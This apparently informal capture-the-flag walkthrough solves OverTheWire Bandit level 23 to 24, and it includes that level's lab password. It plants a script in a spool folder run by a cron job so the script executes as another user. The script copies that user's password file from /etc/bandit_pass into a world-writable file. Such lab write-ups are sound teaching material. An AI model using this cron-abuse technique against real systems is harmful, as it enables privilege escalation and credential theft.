cmdit: ssh -p 2220 bandit23@bandit.labs.overthewire.org
password: 0Zf11ioIjMVN551jX3CmStKLYqjk54Ga

cmdit: cd /etc/cron.d
cmdit: ls
cmdit: cat cronjob_bandit24
cmdit: cat /usr/bin/cronjob_bandit24.sh
Here we get a script which says that in directory /var/spool/bandit24/foo, everything other than '.' and '..' gets executed and deleted.
So, it goes through each file and folder and checks if the owner is bandit23, if it yes, it  timeouts for 60 seconds, if not, it keeps deleting.

So, now we need to create a script, which copies the password from the file which contains it from bandit24 and save it on the localhost.

cmdit: mkdir /tmp/sspam
cmdit: cd /tmp/sspam
cmdit: nano script.sh
Write the below in the file and save it.
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/sspam/pass

Now we need to create the file, where the password is being saved.
cmdit: touch pass

Now give permissions to both the files

cmdit: chmod 777 -R script.sh
cmdit: chmod 777 -R pass
These lines give full permissions to read, write and execute to any user.

cmdit: cp script.sh /var/spool/bandit24/foo
cmdit: ls -l
Here we see that pass file is empty right now, wait for some time or minute at max.

cmdit: ls -l
Now we see that there is something written in the file.

cmdit: cat pass
This gives you password for next bandit.
